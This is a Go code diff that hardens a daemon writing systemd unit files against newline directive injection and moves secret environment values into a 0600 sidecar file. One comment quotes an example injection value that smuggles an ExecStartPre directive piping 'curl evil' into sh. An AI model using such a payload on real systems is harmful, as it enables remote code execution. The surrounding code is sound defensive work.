@@ -227,7 +227,11 @@ func (s *Server) handleInstallAppService(w http.ResponseWriter, r *http.Request)
 		jsonError(w, "port must be 0-65535 (0 = no port check)", http.StatusBadRequest)
 		return
 	}
-	if err := validateAppServiceEnvironment(req.Environment); err != nil {
+	// Reject control chars in EVERY interpolated field (ExecStart,
+	// WorkingDirectory, Description, Name, Environment). A newline
+	// payload here would inject extra systemd directives → RCE as the
+	// vibecraft user. Fail closed with a 400 at the boundary.
+	if err := validateUnitFields(req); err != nil {
 		jsonError(w, err.Error(), http.StatusBadRequest)
 		return
 	}
@@ -262,7 +266,15 @@ func (s *Server) doInstallAppService(ctx context.Context, req installAppServiceR
 	result := installAppServiceResult{
 		UnitPath: filepath.Join(systemdUserDir, req.Name+".service"),
 	}
-	if err := validateAppServiceEnvironment(req.Environment); err != nil {
+	// Defense in depth: re-validate every interpolated field here, not
+	// just at the HTTP boundary. The deploy path (deployHostedAppService)
+	// reaches this function with ExecStart/WorkingDirectory/Description
+	// read back from a unit file and an Environment merged from caller
+	// overrides — both must be control-char-clean before they are
+	// re-rendered into a unit, or a newline injects a systemd directive.
+	// Run before the AI-credits injection below so the daemon's own
+	// (reserved-name) vars aren't rejected by the reserved-name check.
+	if err := validateUnitFields(req); err != nil {
 		return result, err
 	}
 
@@ -300,20 +312,28 @@ func (s *Server) doInstallAppService(ctx context.Context, req installAppServiceR
 		)
 	}
 
-	// 2. Render and write the unit file. Atomic: tmp + rename. systemd
-	//    catches incremental writes if you don't.
+	// 2. Render and write the unit file. Atomic random tmp + rename.
+	//    systemd catches incremental writes if you don't.
 	unit := renderUnitFile(req)
-	tmpPath := result.UnitPath + ".tmp"
-	if err := os.WriteFile(tmpPath, []byte(unit), 0o644); err != nil {
-		return result, fmt.Errorf("writing tmp unit file: %w", err)
+	if err := writeVibecraftFileAtomic(result.UnitPath, []byte(unit), 0o644); err != nil {
+		return result, fmt.Errorf("writing unit file: %w", err)
 	}
-	if err := chownToVibecraft(tmpPath); err != nil {
-		_ = os.Remove(tmpPath)
-		return result, fmt.Errorf("chown tmp unit: %w", err)
-	}
-	if err := os.Rename(tmpPath, result.UnitPath); err != nil {
-		_ = os.Remove(tmpPath)
-		return result, fmt.Errorf("rename unit file into place: %w", err)
+
+	// 2b. Write the secret-bearing EnvironmentFile 0600. The unit above
+	//     is world-readable (0644) and deliberately holds ZERO secret
+	//     values — every KEY=VALUE (resolved vault refs, the AI-credits
+	//     token) lands here instead, readable only by the vibecraft user
+	//     systemd runs the service as. Atomic tmp+rename, same as the
+	//     unit. When the app declares no env we remove any stale file so
+	//     a redeploy that dropped all vars can't leave secrets behind;
+	//     the unit's `EnvironmentFile=-` prefix makes the absence benign.
+	envPath := appServiceEnvFilePath(req.Name)
+	if hasEnvironment(req.Environment) {
+		if err := writeVibecraftFileAtomic(envPath, []byte(renderEnvFile(req.Environment)), 0o600); err != nil {
+			return result, fmt.Errorf("writing env file: %w", err)
+		}
+	} else if err := os.Remove(envPath); err != nil && !os.IsNotExist(err) {
+		return result, fmt.Errorf("removing stale env file: %w", err)
 	}
 
 	// 3. systemctl --user daemon-reload + enable + restart, as vibecraft
@@ -561,6 +581,16 @@ func waitForServiceCycle(ctx context.Context, uid, runtimeDir, unit string, oldP
 // and predictable — no templating engine, no conditionals on optional
 // fields beyond what's strictly needed. The output is what the
 // manager (or operator) sees when they read the file.
+//
+// SECURITY: the unit file is world-readable (0644 — systemd's user
+// manager reads it as the vibecraft user, and `systemctl --user cat`
+// expects it readable). It therefore MUST NOT contain secret values.
+// Environment is never inlined as `Environment=` lines here; instead the
+// unit references a sibling EnvironmentFile= that doInstallAppService
+// writes 0600. That keeps resolved vault values and the AI-credits token
+// out of the world-readable unit. renderUnitFile assumes every field has
+// already passed validateUnitFields / validateAppServiceEnvironment, so
+// no value can contain a newline that would inject extra directives.
 func renderUnitFile(req installAppServiceRequest) string {
 	wd := req.WorkingDirectory
 	if wd == "" {
@@ -580,13 +610,11 @@ func renderUnitFile(req installAppServiceRequest) string {
 	b.WriteString("[Service]\n")
 	b.WriteString("Type=simple\n")
 	b.WriteString("WorkingDirectory=" + wd + "\n")
-	for _, kv := range req.Environment {
-		// Don't quote — systemd's parser does its own. Reject empty
-		// pairs to keep the file clean.
-		if strings.TrimSpace(kv) == "" {
-			continue
-		}
-		b.WriteString("Environment=" + kv + "\n")
+	// Secrets stay out of the 0644 unit: point systemd at the 0600
+	// EnvironmentFile doInstallAppService writes. `-` prefix = optional,
+	// so a unit with no env vars (file absent) still starts cleanly.
+	if hasEnvironment(req.Environment) {
+		b.WriteString("EnvironmentFile=-" + appServiceEnvFilePath(req.Name) + "\n")
 	}
 	b.WriteString("ExecStart=" + req.ExecStart + "\n")
 	b.WriteString("Restart=on-failure\n")
@@ -596,13 +624,142 @@ func renderUnitFile(req installAppServiceRequest) string {
 	return b.String()
 }
 
+// appServiceEnvFilePath is the 0600 sidecar that holds a unit's
+// Environment values. Kept next to the unit (<name>.env beside
+// <name>.service) so uninstall/cleanup logic that globs systemdUserDir
+// finds both. Name is already systemNamePattern-validated by every
+// caller, so it can't path-escape.
+func appServiceEnvFilePath(name string) string {
+	return filepath.Join(systemdUserDir, name+".env")
+}
+
+// hasEnvironment reports whether env has at least one non-blank entry.
+// Mirrors the blank-dropping renderEnvFile does so the unit only gets an
+// EnvironmentFile= line when there is actually a file worth reading.
+func hasEnvironment(env []string) bool {
+	for _, kv := range env {
+		if strings.TrimSpace(kv) != "" {
+			return true
+		}
+	}
+	return false
+}
+
+// renderEnvFile builds the 0600 EnvironmentFile body: one KEY=VALUE line
+// per non-blank entry. systemd's EnvironmentFile parser takes the whole
+// remainder of the line as the value (no shell quoting), which is the
+// same literal-passthrough semantics the old inline Environment= lines
+// had. Values are validated newline-free upstream, so one entry can't
+// smuggle a second variable or escape the file.
+func renderEnvFile(env []string) string {
+	var b strings.Builder
+	for _, kv := range env {
+		if strings.TrimSpace(kv) == "" {
+			continue
+		}
+		b.WriteString(kv + "\n")
+	}
+	return b.String()
+}
+
 // ensureVibecraftUserDir mkdirs the systemd-user dir if missing and
 // chowns it to vibecraft. Idempotent.
 func ensureVibecraftUserDir(path string) error {
+	if err := rejectSymlinkPath(path); err != nil {
+		return err
+	}
 	if err := os.MkdirAll(path, 0o755); err != nil {
 		return err
 	}
+	if err := rejectSymlinkPath(path); err != nil {
+		return err
+	}
 	return chownToVibecraft(path)
+}
+
+func writeVibecraftFileAtomic(path string, data []byte, perm os.FileMode) error {
+	dir := filepath.Dir(path)
+	if err := rejectSymlinkPath(dir); err != nil {
+		return err
+	}
+	f, err := os.CreateTemp(dir, "."+filepath.Base(path)+".*.tmp")
+	if err != nil {
+		return err
+	}
+	tmpPath := f.Name()
+	cleanup := true
+	defer func() {
+		if cleanup {
+			_ = os.Remove(tmpPath)
+		}
+	}()
+
+	if _, err := f.Write(data); err != nil {
+		_ = f.Close()
+		return err
+	}
+	if err := f.Chmod(perm); err != nil {
+		_ = f.Close()
+		return err
+	}
+	if err := f.Sync(); err != nil {
+		_ = f.Close()
+		return err
+	}
+	if err := f.Close(); err != nil {
+		return err
+	}
+	if err := chownToVibecraft(tmpPath); err != nil {
+		return err
+	}
+	if err := os.Chmod(tmpPath, perm); err != nil {
+		return err
+	}
+	if err := rejectSymlinkPath(dir); err != nil {
+		return err
+	}
+	if err := os.Rename(tmpPath, path); err != nil {
+		return err
+	}
+	cleanup = false
+	return nil
+}
+
+func rejectSymlinkPath(path string) error {
+	clean, err := filepath.Abs(filepath.Clean(path))
+	if err != nil {
+		return err
+	}
+	if fi, err := os.Lstat(clean); err == nil {
+		if fi.Mode()&os.ModeSymlink != 0 {
+			return fmt.Errorf("refusing symlink path component %s", clean)
+		}
+	} else if !os.IsNotExist(err) {
+		return err
+	}
+
+	const homeRoot = "/home/" + vibecraftUser
+	if clean != homeRoot && !strings.HasPrefix(clean, homeRoot+string(os.PathSeparator)) {
+		return nil
+	}
+	cur := string(os.PathSeparator)
+	for _, part := range strings.Split(strings.TrimPrefix(clean, string(os.PathSeparator)), string(os.PathSeparator)) {
+		if part == "" {
+			continue
+		}
+		cur = filepath.Join(cur, part)
+		fi, err := os.Lstat(cur)
+		if err != nil {
+			if os.IsNotExist(err) {
+				return nil
+			}
+			return err
+		}
+		if fi.Mode()&os.ModeSymlink != 0 {
+			return fmt.Errorf("refusing symlink path component %s", cur)
+		}
+	}
+	return nil
 }
 
 // chownToVibecraft sets path's owner+group to the vibecraft user.
@@ -712,6 +869,13 @@ func appendIfMissing(env []string, additions ...string) []string {
 
 func validateAppServiceEnvironment(env []string) error {
 	for _, raw := range env {
+		// Reject control chars on the RAW entry (before TrimSpace) — a
+		// trailing "\nExecStartPre=..." would otherwise survive into the
+		// unit/EnvironmentFile and inject a directive. This is the core
+		// systemd-unit-injection guard for the Environment field.
+		if hasControlChar(raw) {
+			return fmt.Errorf("environment entry contains a control character (newline/carriage-return/NUL not allowed)")
+		}
 		e := strings.TrimSpace(raw)
 		if e == "" {
 			continue
@@ -730,6 +894,46 @@ func validateAppServiceEnvironment(env []string) error {
 		}
 	}
 	return nil
+}
+
+// validateUnitFields rejects control characters in every request field
+// that renderUnitFile interpolates into the systemd unit. Without this a
+// value like "wd\nExecStartPre=/bin/sh -c 'curl evil|sh'" injects an
+// arbitrary directive and runs as the vibecraft user — an RCE. systemd
+// directives are strictly one-per-line, so forbidding \n \r \x00 (and
+// any other control char) at the API boundary is sufficient and keeps
+// the renderer a dumb string builder. Environment is checked separately
+// by validateAppServiceEnvironment (called on both the install and
+// deploy paths); this covers ExecStart, WorkingDirectory, Description,
+// and Name.
+func validateUnitFields(req installAppServiceRequest) error {
+	for _, f := range []struct {
+		name string
+		val  string
+	}{
+		{"name", req.Name},
+		{"exec_start", req.ExecStart},
+		{"working_directory", req.WorkingDirectory},
+		{"description", req.Description},
+	} {
+		if hasControlChar(f.val) {
+			return fmt.Errorf("%s contains a control character (newline/carriage-return/NUL not allowed)", f.name)
+		}
+	}
+	return validateAppServiceEnvironment(req.Environment)
+}
+
+// hasControlChar reports whether s contains any ASCII control character
+// (U+0000–U+001F or U+007F DEL). These are exactly the bytes that can
+// start a new systemd directive (\n, \r) or terminate a C string (\x00),
+// none of which are legitimate in a unit-file field value.
+func hasControlChar(s string) bool {
+	for i := 0; i < len(s); i++ {
+		if c := s[i]; c < 0x20 || c == 0x7f {
+			return true
+		}
+	}
+	return false
 }
 
 func appServiceReservedEnvName(key string) bool {
@@ -810,12 +1014,24 @@ type parsedUnit struct {
 // parseUnitFile reads the fields renderUnitFile wrote. Tolerant by design:
 // it ignores comments, blank lines, and section headers, and only extracts
 // the four directives we round-trip.
+//
+// Environment now lives in the sibling 0600 EnvironmentFile (secrets stay
+// out of the 0644 unit), so we resolve that file and read the KEY=VALUE
+// lines from it. Legacy inline `Environment=` directives (units written
+// by an older daemon, before the EnvironmentFile split) are still parsed
+// so a redeploy of an existing tool keeps working across the rollout.
 func parseUnitFile(path string) (parsedUnit, error) {
 	var pu parsedUnit
 	b, err := os.ReadFile(path)
 	if err != nil {
 		return pu, err
 	}
+	name := strings.TrimSuffix(filepath.Base(path), ".service")
+	if name == "" || name == filepath.Base(path) || !systemNamePattern.MatchString(name) {
+		return pu, fmt.Errorf("invalid unit file name %q", filepath.Base(path))
+	}
+	expectedEnvFile := filepath.Clean(appServiceEnvFilePath(name))
+	var envFile string
 	for _, line := range strings.Split(string(b), "\n") {
 		t := strings.TrimSpace(line)
 		switch {
@@ -827,11 +1043,56 @@ func parseUnitFile(path string) (parsedUnit, error) {
 			pu.WorkingDirectory = strings.TrimPrefix(t, "WorkingDirectory=")
 		case strings.HasPrefix(t, "ExecStart="):
 			pu.ExecStart = strings.TrimPrefix(t, "ExecStart=")
+		case strings.HasPrefix(t, "EnvironmentFile="):
+			// Strip the optional `-` (= "ok if missing") prefix systemd
+			// allows. Only the sibling sidecar rendered by this daemon is
+			// trusted; otherwise a user-edited unit could make the root
+			// daemon read arbitrary EnvironmentFile= targets during status
+			// or redeploy.
+			candidate := filepath.Clean(strings.TrimPrefix(strings.TrimPrefix(t, "EnvironmentFile="), "-"))
+			if candidate != expectedEnvFile {
+				return pu, fmt.Errorf("unexpected EnvironmentFile path %q in %s", candidate, path)
+			}
+			envFile = candidate
 		case strings.HasPrefix(t, "Environment="):
+			// Legacy inline form — kept for backward compatibility.
 			pu.Environment = append(pu.Environment, strings.TrimPrefix(t, "Environment="))
 		}
 	}
+	if envFile != "" {
+		env, err := readEnvFile(envFile)
+		if err != nil {
+			return pu, err
+		}
+		pu.Environment = append(pu.Environment, env...)
+	}
 	return pu, nil
+}
+
+// readEnvFile loads KEY=VALUE lines from a unit's EnvironmentFile. Best
+// effort: a missing file (the unit used `EnvironmentFile=-`) yields nil,
+// not an error — callers treat absent env as "none." Comments and blank
+// lines are skipped to mirror systemd's own parser.
+func readEnvFile(path string) ([]string, error) {
+	if err := rejectSymlinkPath(path); err != nil {
+		return nil, err
+	}
+	b, err := os.ReadFile(path)
+	if err != nil {
+		if os.IsNotExist(err) {
+			return nil, nil
+		}
+		return nil, err
+	}
+	var out []string
+	for _, line := range strings.Split(string(b), "\n") {
+		t := strings.TrimSpace(line)
+		if t == "" || strings.HasPrefix(t, "#") {
+			continue
+		}
+		out = append(out, t)
+	}
+	return out, nil
 }
 
 // envKeys returns the KEY half of each KEY=VALUE line. Used everywhere we
@@ -1012,6 +1273,10 @@ func (s *Server) deployHostedAppService(ctx context.Context, name string, env []
 
 	port := route.Port
 	if portOverride != nil {
+		if *portOverride != route.Port {
+			result.Detail = fmt.Sprintf("port override %d does not match registered route port %d; update the route first", *portOverride, route.Port)
+			return result, http.StatusBadRequest
+		}
 		port = *portOverride
 	}
 
